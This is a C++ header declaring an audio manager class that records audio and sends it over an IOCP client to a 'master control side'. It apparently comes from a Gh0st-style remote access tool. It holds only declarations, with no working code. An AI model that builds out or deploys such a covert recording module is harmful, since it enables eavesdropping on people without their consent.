#pragma once
#include "Manager.h"
#include"Audio.h"
#include"ProcessHelper.h"
#include"Common.h"
class CAudioManager :
    public CManager
{
public:
    CAudioManager(CIocpClient* IocpClient);
    BOOL OnInitMember();
    ~CAudioManager();
    void HandleIo(PBYTE BufferData, ULONG_PTR BufferLength);
    static DWORD WINAPI SendDataProcedure(LPVOID ParameterData);
    int SendRecordData();   //发送一个录播数据到主控端
private:
    BOOL m_IsLoop = FALSE;
    CAudio* m_Audio = NULL;
    HANDLE m_ThreadHandle;
};

